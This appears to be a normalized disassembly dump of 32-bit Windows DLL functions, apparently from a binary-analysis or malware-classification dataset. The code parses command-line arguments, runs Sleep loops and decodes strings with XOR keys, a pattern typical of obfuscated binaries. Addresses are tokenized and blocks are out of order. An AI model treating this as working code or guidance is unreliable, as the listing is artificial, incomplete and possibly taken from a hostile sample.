lea ebx [ eax + eax + 0x2 ]
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x6c ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
push ebx
push esi
push 0xffffffff
push edi
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
lea eax [ ebp - 0x70 ]
push eax
push esi
call [ CommandLineToArgvW@IAT ]
mov edi eax
xor esi esi
cmp edi esi
je r-xdata
lea edx [ ebp - 0x18 ]
lea eax [ esi + 0xd ]
call sub_10045930
lea edx [ ebp - 0x24 ]
mov eax 0x10b
call sub_10045930
lea edx [ ebp - 0x4c ]
lea eax [ esi + 0x21 ]
call sub_10045930
lea edx [ ebp - 0x34 ]
lea eax [ esi + 0xc ]
call sub_10045930
xor ebx ebx
cmp [ ebp - 0x70 ] esi
jle r-xdata
jmp r-xdata
lea eax [ ebp - 0x18 ]
lea edx [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
mov edx [ edi + ebx * 4 ]
sar eax 0x1
push eax
lea ecx [ ebp - 0x18 ]
push ecx
push edx
call sub_1005feb0
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x24 ]
lea edx [ eax + 0x2 ]
jmp r-xdata
lea eax [ ebp - 0x18 ]
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
mov ecx [ edi + ebx * 4 ]
sub eax edx
sar eax 0x1
lea ecx [ ecx + eax * 2 ]
xor edx edx
mov eax ecx
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x54 ] 0x7
mov [ ebp - 0x68 ] dx
lea esi [ eax + 0x2 ]
lea ebx [ ebx ]
sub eax edx
sar eax 0x1
push eax
mov eax [ edi + ebx * 4 ]
lea edx [ ebp - 0x24 ]
push edx
push eax
call sub_1005feb0
add esp 0xc
test eax eax
jne r-xdata
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push ecx
lea ecx [ ebp - 0x68 ]
call sub_1005ddc0
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x6c ]
jmp r-xdata
lea eax [ ebp - 0x4c ]
lea edx [ eax + 0x2 ]
lea eax [ ebp - 0x24 ]
lea edx [ eax + 0x2 ]
mov edi edi
lea eax [ ebp - 0x68 ]
push eax
call sub_100649e0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x54 ] 0x8
jb r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
sar eax 0x1
push eax
mov eax [ edi + ebx * 4 ]
lea edx [ ebp - 0x4c ]
push edx
push eax
call sub_1005feb0
add esp 0xc
test eax eax
jne r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
mov ecx [ edi + ebx * 4 ]
sub eax edx
sar eax 0x1
lea ecx [ ecx + eax * 2 ]
xor edx edx
mov eax ecx
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x54 ] 0x7
mov [ ebp - 0x68 ] dx
lea esi [ eax + 0x2 ]
lea ebx [ ebx ]
inc ebx
cmp ebx [ ebp - 0x70 ]
jl r-xdata
mov ecx [ ebp - 0x68 ]
push ecx
call sub_100187af
add esp 0x4
jmp r-xdata
lea eax [ ebp - 0x34 ]
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
lea eax [ ebp - 0x4c ]
lea edx [ eax + 0x2 ]
jmp r-xdata
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push ecx
lea ecx [ ebp - 0x68 ]
call sub_1005ddc0
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x6c ]
add ecx 0x1c
xor esi esi
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
sar eax 0x1
push eax
mov eax [ edi + ebx * 4 ]
lea edx [ ebp - 0x34 ]
push edx
push eax
call sub_1005feb0
add esp 0xc
test eax eax
jne r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
lea eax [ ebp - 0x34 ]
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov ecx [ edi + ebx * 4 ]
sub eax edx
sar eax 0x1
lea edx [ ecx + eax * 2 ]
push edx
call [ StrToIntW@IAT ]
mov ecx [ ebp - 0x6c ]
mov [ ecx + 0x38 ] eax
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
mov ecx [ edi + ebx * 4 ]
sub eax edx
sar eax 0x1
lea edx [ ecx + eax * 2 ]
push edx
call [ StrToIntW@IAT ]
mov ecx [ ebp - 0x6c ]
mov [ ecx + 0x3c ] eax
sub_10060900
push ebp
mov ebp esp
push 0xffffffff
push sub_1008a1f8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov esi edx
xor ebx ebx
xor edx edx
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x68 ] ecx
mov [ ebp - 0x1c ] 0x7
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] dx
lea eax [ ebp - 0x30 ]
push eax
push esi
mov [ ebp - 0x4 ] ebx
call sub_1000adf0
test eax eax
je r-xdata
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0xc ] ebx
je r-xdata
cmp [ ebp - 0x1c ] 0x8
jb r-xdata
mov edx [ ebp - 0x6c ]
mov ecx [ ebp - 0x68 ]
push edx
lea eax [ ebp - 0x64 ]
push eax
lea edx [ ebp - 0x30 ]
call sub_10003c30
mov esi [ ebp - 0x64 ]
test eax eax
je r-xdata
xor edx edx
xor eax eax
mov [ ebp - 0x40 ] 0x7
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] dx
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] 0x2
mov esi [ esi + 0x10 ]
mov eax esi
lea edx [ eax + 0x2 ]
mov edi edi
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_100187af
add esp 0x4
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x54 ]
call sub_1005ddc0
mov eax [ ebp + 0xc ]
mov [ ebp - 0x38 ] edi
lea ecx [ ebp - 0x54 ]
lea edi [ ebp - 0x64 ]
mov [ ebp - 0x34 ] eax
call sub_10048ba0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x40 ] 0x8
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0xc
cmp [ ebp - 0x1c ] 0x8
jb r-xdata
mov edi [ ebp - 0x60 ]
mov eax esi
call sub_100699f0
push esi
call sub_100187af
add esp 0x4
cmp [ ebp - 0x1c ] 0x8
jb r-xdata
mov edi [ ebp - 0x60 ]
mov eax esi
call sub_100699f0
push esi
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x54 ]
push ecx
call sub_100187af
add esp 0x4
xor eax eax
mov edx [ ebp - 0x30 ]
push edx
call sub_100187af
add esp 0x4
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_100187af
add esp 0x4
sub_10060a86
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov esi ebx
jmp r-xdata
lea edi [ ebp + 0x8 ]
push eax
call sub_1005af1f
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp + 0xf ] al
inc esi
cmp al 0x2b
je r-xdata
mov esi 0x7fffffff
cmp ebx [ edi ]
jne r-xdata
mov [ edi ] ebx
mov [ ebp + 0xf ] 0x2b
jmp r-xdata
cmp [ ebp + 0xf ] 0x2b
jne r-xdata
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_10060ef0
add esp 0x10
cmp esi [ edi ]
jne r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
cmp eax esi
ja r-xdata
call sub_1006299d
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp eax 0x80000000
jbe r-xdata
xor eax eax
cmp [ ebp + 0xf ] 0x2d
sete al
add eax esi
jmp r-xdata
mov [ eax ] 0x1
neg eax
sub_10060b30
push ebp
mov ebp esp
push 0xffffffff
push sub_10086d18
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_10034e98
mov [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov edi [ ebp + 0x8 ]
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_1001706d
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10069747
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_10028a00
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp + 0x8 ]
mov [ rw-data ] esi
call sub_10034e98
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call sub_1002c57b
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_10024fe9
lea ecx [ ebp + 0x8 ]
call sub_10069747
push esi
call sub_10062b65
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_10060c80
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x20 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x18 ]
mov [ esi ] eax
xor edx edx
push edi
mov edi [ ebp + 0x10 ]
mov [ ebx ] ecx
mov eax [ esi ]
cmp eax edi
setne dl
mov [ ebp + 0x14 ] edx
cmp eax edi
je r-xdata
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
mov ecx [ ebx ]
cmp ecx [ ebp + 0x1c ]
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ esi ]
add edx 0x8
push edx
mov edx [ ebp + 0x8 ]
push edx
mov edx edi
sub edx eax
push edx
push eax
push ecx
call sub_10026eb0
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
mov [ esi ] edi
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn 0x1c
test eax eax
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov ecx [ ebx ]
cmp [ ecx ] ax
jne r-xdata
add [ esi ] eax
add [ ebx ] 0x2
mov [ ebp + 0x14 ] 0x0
cmp [ esi ] edi
jne r-xdata
xor eax eax
mov eax [ esi ]
lea edx [ eax + 0x1 ]
mov edi edi
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
sub_10060d3e
push 0x28
mov eax sub_10085471
call sub_100624bc
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x6
pop eax
call sub_10013ab8
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x8
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
jmp r-xdata
sub_10060dbd
mov edi edi
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push [ ebx + 0x28 ]
lea eax [ ebx + 0x20 ]
push eax
push [ ebx + 0x8 ]
call sub_1004abc6
add esp 0xc
test eax eax
jne r-xdata
push [ ebx + 0x8 ]
call sub_10027f26
add esp 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp - 0x40 ]
fld [ ebx + 0x18 ]
and eax 0xffffffe3
fstp [ ebp - 0x50 ]
or eax 0x3
mov [ ebp - 0x40 ] eax
push 0x0
lea eax [ ebx + 0x20 ]
push eax
lea eax [ ebx + 0x10 ]
push eax
push [ ebx + 0xc ]
lea eax [ ebx + 0x28 ]
push [ ebx + 0x8 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_10039795
add esp 0x1c
push eax
call sub_100186c6
mov [ esp ] 0xffff
push [ ebx + 0x28 ]
call sub_1002b306
fld [ ebx + 0x20 ]
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebx + 0x28 ]
fld [ ebx + 0x20 ]
sub esp 0x18
fstp [ esp + 0x10 ]
fld [ ebx + 0x18 ]
fstp [ esp + 0x8 ]
fld [ ebx + 0x10 ]
fstp [ esp ]
push [ ebx + 0xc ]
push eax
call sub_10019714
add esp 0x24
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
sub_10060ea0
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_10060ef0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
sub esp 0x14
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
mov edi [ ebp + 0x8 ]
movzx eax [ edi ]
mov esi edi
jmp r-xdata
mov [ eax ] ebx
push eax
call sub_1005af1f
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp - 0x1 ] al
inc esi
cmp al 0x2b
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax ebx
je r-xdata
cmp eax 0x1
je r-xdata
mov [ ebp - 0x1 ] 0x2b
jmp r-xdata
xor eax eax
mov [ eax ] edi
cmp eax 0x24
jg r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jl r-xdata
mov cl 0x30
cmp eax ebx
jle r-xdata
cmp [ esi ] cl
je r-xdata
cmp eax 0x10
jne r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
cmp [ esi ] cl
jne r-xdata
mov [ ebp + 0x10 ] 0x10
cmp al 0x58
je r-xdata
cmp [ esi ] cl
je r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
inc esi
movsx eax [ esi ]
push [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ebx
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0xc ] ebx
call sub_1003f57a
pop ecx
push eax
mov edi r--data
push edi
call sub_1007f360
add esp 0xc
cmp eax ebx
je r-xdata
add esi 0x2
cmp al 0x58
jne r-xdata
mov bl [ ebp + 0x13 ]
mov ecx [ ebp - 0x8 ]
push [ ebp + 0x10 ]
mov bl al
mov eax edi
sub bl al
mov eax ecx
imul eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
movsx ecx bl
add eax ecx
mov [ ebp - 0x8 ] eax
inc esi
movsx eax [ esi ]
push eax
call sub_1003f57a
pop ecx
push eax
push edi
call sub_1007f360
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov ecx [ ebp + 0x10 ]
movsx edx [ ecx + r--data ]
mov eax esi
sub eax edx
sub eax [ ebp - 0x14 ]
js r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
jmp r-xdata
cmp [ ebp - 0x1 ] 0x2d
jne r-xdata
test eax eax
jg r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
cmp [ ebp - 0x10 ] esi
jne r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
neg [ ebp - 0x8 ]
call sub_1006299d
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
movsx edx bl
sub eax edx
cmp [ ebp - 0x8 ] eax
jb r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov [ eax ] esi
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0x1 ] 0x2b
mov [ eax ] 0x1
xor edx edx
div ecx
cmp eax [ ebp - 0xc ]
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_1006108c
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_1007fc10
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_100610eb
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10025035
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_1006113d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1001da0a
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x10 ]
push eax
push 0x8
push [ ebp + 0x8 ]
call sub_100079d1
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_100611b0
push ebp
mov ebp esp
push 0xffffffff
push sub_100893b1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x84
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov eax [ ebx + 0xc8 ]
sub eax [ ebx + 0xc4 ]
mov edi edx
sar eax 0x2
xor esi esi
mov [ ebp - 0x88 ] edi
test eax eax
je r-xdata
push 0x44
call sub_1001f84c
add esp 0x4
mov [ ebp - 0x88 ] eax
xor ecx ecx
mov [ ebp - 0x4 ] ecx
cmp eax ecx
je r-xdata
mov ecx [ ebx + 0xc4 ]
mov edi [ edi + 0x4 ]
mov [ ebp - 0x88 ] ecx
mov edx ecx
mov edx edi
mov edi eax
call sub_100262f0
mov edx eax
mov [ ebp - 0x88 ] edx
jmp r-xdata
mov eax [ ebx + 0xc4 ]
mov ecx [ eax + esi * 4 ]
mov eax [ ebp - 0x88 ]
push ecx
call sub_10068c90
mov eax esi
jmp r-xdata
inc esi
add ecx 0x4
cmp esi eax
jb r-xdata
movsx esi [ ecx + eax ]
xor esi eax
xor esi 0xfffd
and esi 0xff
mov [ ebp + eax * 2 - 0x4c ] si
inc eax
cmp eax 0x1c
jb r-xdata
xor eax eax
mov [ ebp - 0x14 ] ax
mov eax [ edx + 0x4 ]
push eax
lea ecx [ ebp - 0x84 ]
push ecx
call sub_1005f2b0
push eax
lea edx [ ebp - 0x4c ]
lea esi [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x1
call sub_1005bbc0
add esp 0xc
mov edx eax
mov ecx 0xce
mov [ ebp - 0x4 ] 0x2
call sub_100205a0
mov esi 0x8
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ r--data ]
mov [ ebp - 0x8c ] edx
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ ecx ]
cmp [ edx + 0x4 ] edi
je r-xdata
mov edi [ ebp - 0x88 ]
xor eax eax
mov edi 0x7
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x68 ] ax
cmp [ ebp - 0x70 ] esi
jb r-xdata
mov edx [ ebp - 0x68 ]
push edx
call sub_100187af
add esp 0x4
mov eax [ ebx + 0xc8 ]
xor edx edx
lea ecx [ ebp - 0x8c ]
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x74 ] 0x0
mov [ ebp - 0x84 ] dx
cmp ecx eax
jae r-xdata
mov ecx [ ebp - 0x84 ]
push ecx
call sub_100187af
add esp 0x4
mov ecx [ ebx + 0xcc ]
cmp eax ecx
jne r-xdata
mov edx [ ebx + 0xc4 ]
cmp edx ecx
ja r-xdata
mov eax [ ebx + 0xc8 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc4 ]
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov edi ecx
mov ecx [ ebx + 0xcc ]
sub edi edx
sar edi 0x2
cmp eax ecx
jne r-xdata
add [ ebx + 0xc8 ] 0x4
mov eax [ ebx + 0xc8 ]
sub eax [ ebx + 0xc4 ]
sar eax 0x2
dec eax
mov edx [ ebp - 0x88 ]
mov [ eax ] edx
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call sub_1000831a
mov eax [ ebx + 0xc8 ]
test eax eax
je r-xdata
sub eax edx
sar eax 0x2
cmp eax 0x3ffffffe
jbe r-xdata
mov edx ecx
shr edx 0x1
mov esi 0x3fffffff
sub esi edx
cmp esi ecx
jae r-xdata
mov edx [ ebx + 0xc4 ]
mov ecx [ edx + edi * 4 ]
mov [ eax ] ecx
jmp r-xdata
sub ecx edx
inc eax
sar ecx 0x2
cmp eax ecx
jbe r-xdata
push r--data
call sub_1000831a
add ecx edx
xor ecx ecx
jmp r-xdata
mov edx ecx
shr edx 0x1
mov esi 0x3fffffff
sub esi edx
cmp esi ecx
jae r-xdata
push ecx
lea esi [ ebx + 0xc4 ]
call sub_10006cb0
mov ecx eax
cmp ecx eax
jae r-xdata
add ecx edx
xor ecx ecx
jmp r-xdata
push ecx
lea esi [ ebx + 0xc4 ]
call sub_10006cb0
mov ecx eax
cmp ecx eax
jae r-xdata
sub_10061460
push ebp
mov ebp esp
sub esp 0xc
push esi
push 0x18
mov esi ecx
call sub_1001f84c
xor edx edx
add esp 0x4
cmp eax edx
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] edx
call sub_10069ac6
push r--data
lea ecx [ ebp - 0xc ]
push ecx
mov [ ebp - 0xc ] r--data
call sub_10024fe9
int3
mov ecx [ esi + 0x4 ]
mov [ eax ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x8 ] ecx
lea ecx [ eax + 0xc ]
mov [ eax + 0x14 ] dx
cmp ecx edx
je r-xdata
pop esi
mov esp ebp
pop ebp
retn 0x4
mov esi [ ebp + 0x8 ]
mov edx [ esi ]
mov [ ecx ] edx
mov dl [ esi + 0x4 ]
mov [ ecx + 0x4 ] dl
sub_100614d0
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x69
and edx 0xff
mov [ ebp + eax * 2 - 0x10 ] dx
inc eax
cmp eax 0x5
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x6 ] ax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffa8
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0x7
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x12 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x58
and edx 0xff
mov [ ebp + eax * 2 - 0x30 ] dx
inc eax
cmp eax 0x6
jb r-xdata
push ebx
push esi
mov esi [ lstrlenW@IAT ]
push edi
lea ecx [ ebp - 0x30 ]
xor eax eax
push ecx
mov [ ebp - 0x24 ] ax
call esi
lea edx [ ebp - 0x20 ]
push edx
mov edi eax
call esi
add edi eax
lea eax [ ebp - 0x10 ]
push eax
call esi
add eax edi
lea ecx [ eax + eax + 0x6 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
call esi
add eax eax
push eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_1007f5d0
add esp 0xc
lea ecx [ ebp - 0x10 ]
push ecx
call esi
push r--data
mov edi eax
call esi
add eax eax
push eax
lea edx [ ebx + edi * 2 ]
push r--data
push edx
call sub_1007f5d0
add esp 0xc
push r--data
call esi
add edi eax
lea eax [ ebp - 0x20 ]
push eax
call esi
add eax eax
push eax
lea ecx [ ebp - 0x20 ]
push ecx
lea edx [ ebx + edi * 2 ]
push edx
call sub_1007f5d0
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
call esi
push r--data
add edi eax
call esi
add eax eax
push eax
lea ecx [ ebx + edi * 2 ]
push r--data
push ecx
call sub_1007f5d0
add esp 0xc
push r--data
call esi
lea edx [ ebp - 0x30 ]
push edx
add edi eax
call esi
add eax eax
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebx + edi * 2 ]
push ecx
call sub_1007f5d0
mov ecx [ ebp - 0x4 ]
add esp 0xc
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
